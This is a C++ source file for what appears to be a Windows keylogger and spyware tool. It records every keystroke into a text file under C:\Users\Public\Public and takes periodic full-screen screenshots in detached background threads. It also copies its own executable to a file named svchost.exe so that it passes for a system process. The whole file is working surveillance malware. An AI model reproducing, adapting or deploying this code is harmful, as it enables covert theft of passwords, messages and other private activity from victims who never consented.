#include "KeyMaster.h"

void writeData(std::string input) {
  std::ofstream LogFile;
  LogFile.open("C:\\Users\\Public\\Public\\keylogs.txt", std::fstream::app);

  LogFile << input;

  if (input == " **ENTER**\n") {
    LogFile << std::endl;
  }

  LogFile.close();
}

bool SpecialKeys(int vKey) {
  switch (vKey) {
    case VK_SPACE:
      writeData(" **SPACE**\n");
      return true;

    case VK_RETURN:      
      writeData(" **ENTER**\n");
      return true;

    case VK_BACK:
      writeData(" **BACKSPACE**\n");
      return true;

    case VK_RBUTTON:
      writeData(" **RIGHT_CLICK**\n");
      return true;

    case VK_LBUTTON:
      writeData(" **LEFT_CLICK**\n");
      return true;

    case VK_CAPITAL:
      writeData(" **CAPS_LOCK**\n");
      return true;

    case VK_TAB:
      writeData(" **TAB**\n");
      return true;

    case VK_UP:
      writeData(" **UP_ARROW_KEY**\n");
      return true;

    case VK_DOWN:
      writeData(" **DOWN_ARROW_KEY**\n");
      return true;

    case VK_LEFT:
      writeData(" **LEFT_ARROW_KEY**\n");
      return true;

    case VK_RIGHT:
      writeData(" **RIGHT_ARROW_KEY**\n");
      return true;

    case VK_MENU:
      writeData(" **ALT**\n");
      return true;

    case VK_F1:
      writeData(" **F1**\n");
      return true;

    case VK_F2:
      writeData(" **F2**\n");
      return true;

    case VK_F3:
      writeData(" **F3**\n");
      return true;

    case VK_F4:
      writeData(" **F4**\n");
      return true;

    case VK_F5:
      writeData(" **F5**\n");
      return true;

    case VK_F6:
      writeData(" **F6**\n");
      return true;

    case VK_F7:
      writeData(" **F7**\n");
      return true;

    case VK_F8:
      writeData(" **F8**\n");
      return true;

    case VK_F9:
      writeData(" **F9**\n");
      return true;

    case VK_F10:
      writeData(" **F10**\n");
      return true;

    case VK_F11:
      writeData(" **F11**\n");
      return true;

    case VK_F12:
      writeData(" **F12**\n");
      return true;

    case VK_ESCAPE:
      writeData(" **ESCAPE**\n");
      return true;

    case VK_END:
      writeData(" **END**\n");
      return true;

    case VK_HOME:
      writeData(" **HOME**\n");
      return true;

    case VK_DELETE:
      writeData(" **DELETE**\n");
      return true;

    case VK_SNAPSHOT:
      writeData(" **SNAPSHOT**\n");
      return true;

    case VK_SCROLL:
      writeData(" **SCROLL_LOCK**\n");
      return true;

    case VK_NUMPAD0:
      writeData("0");
      return true;

    case VK_NUMPAD1:
      writeData("1");
      return true;

    case VK_NUMPAD2:
      writeData("2");
      return true;

    case VK_NUMPAD3:
      writeData("3");
      return true;

    case VK_NUMPAD4:
      writeData("4");
      return true;

    case VK_NUMPAD5:
      writeData("5");
      return true;

    case VK_NUMPAD6:
      writeData("6");
      return true;

    case VK_NUMPAD7:
      writeData("7");
      return true;

    case VK_NUMPAD8:
      writeData("8");
      return true;

    case VK_NUMPAD9:
      writeData("9");
      return true;

    case VK_MULTIPLY:
      writeData("*");
      return true;

    case VK_ADD:
      writeData("+");
      return true;

    case VK_SUBTRACT:
      writeData("-");
      return true;

    case VK_DECIMAL:
      writeData(".");
      return true;

    case VK_DIVIDE:
      writeData("/");
      return true;

    case VK_OEM_PERIOD:
      writeData(".");
      return true;

    case VK_OEM_1:
      writeData(";:");
      return true;

    case VK_OEM_2:
      writeData("/?");
      return true;

    case VK_OEM_3:
      writeData("`~");
      return true;

    case VK_OEM_4:
      writeData("[{");
      return true;

    case VK_OEM_5:
      writeData("|");
      return true;

    case VK_OEM_6:
      writeData("]}");
      return true;

    case VK_OEM_7:
      writeData("''");
      return true;

    case VK_OEM_COMMA:
      writeData(",");
      return true;

    case VK_OEM_PLUS:
      writeData(";");
      return true;

    case VK_OEM_MINUS:
      writeData("-_");
      return true;

    case VK_PRIOR:
      writeData(" **PAGE_UP**\n");
      return true;

    case VK_NEXT:
      writeData(" **PAGE_DOWN**\n");
      return true;

    case VK_NUMLOCK:
      writeData(" **NUMLOCK**\n");
      return true;

    case VK_LWIN:
      writeData(" **WIN**\n");
      return true;

    case VK_LSHIFT:
      writeData(" **LEFT_SHIFT**\n");
      return true;

    case VK_RSHIFT:
      writeData(" **RIGHT_SHIFT**\n");
      return true;

    case VK_LCONTROL:
      writeData(" **LEFT_CONTROL**\n");
      return true;

    case VK_RCONTROL:
      writeData(" **RIGHT_CONTROL**\n");
      return true;

    default:
      return false;
  }
}

void logger() {
  std::ofstream LogFile("C:\\Users\\Public\\Public\\keylogs.txt",
                        std::fstream::trunc);
  LogFile.close();

  while (true) {
    Sleep(10);
    for (int key = 0; key <= 255; key++) {
      if (GetAsyncKeyState(key) & 0x0001) {
        if (SpecialKeys(key) == false) {
          LogFile.open("C:\\Users\\Public\\Public\\keylogs.txt", std::fstream::app);
          LogFile << char(key);
          LogFile.close();
        }
      }
    }
  }
}

void takeScreenshots(Utils util) {
  char alph[] = "qwertyuiopsdfghjklzxcvbnm";
  int i = 0, d = 0, j = 0;
  const std::string start = "C:\\Users\\Public\\Public\\Screens\\screenshot";

  while (true) {
    Sleep(50000);

    std::string screen =
        start + (char)(j + 48) + (char)(i + 48) + (char)(d + 48) + ".bmp";
    char* bmp = new char[screen.size() + 1];

    strcpy(bmp, screen.c_str());

    util.Screenshot(0, 0, 1920, 1080, (char*)(bmp), NULL);

    d++;

    if (d == 10) {
      d = 0;
      i++;
    }

    if (i == 10) {
      i = 0;
      j++;
    }
  }
}

void start_x(Utils util) {
  if (_access("C:\\Users\\Public\\Public", 0)) {
    _mkdir("C:\\Users\\Public\\Public");
  }

  if (_access("C:\\Users\\Public\\Public\\Screens", 0)) {
    _mkdir("C:\\Users\\Public\\Public\\Screens");
  }

  std::string s = util.FindPath();
  std::wstring stemp = std::wstring(s.begin(), s.end());
  LPCWSTR path = stemp.c_str();

  CopyFile(reinterpret_cast<LPCSTR>(path), "C:\\Users\\Public\\Public\\svchost.exe", TRUE);

  std::string screen = "C:\\Users\\Public\\Public\\Screens\\screenshot.bmp";
  char* bmp = new char[screen.size() + 1];

  strcpy(bmp, screen.c_str());
  util.Screenshot(0, 0, 1920, 1080, (char*)(bmp), NULL);

  std::thread logger_f = std::thread(logger);
  std::thread screens = std::thread(takeScreenshots, util);

  logger_f.detach();
  screens.detach();

  delete[] bmp;
}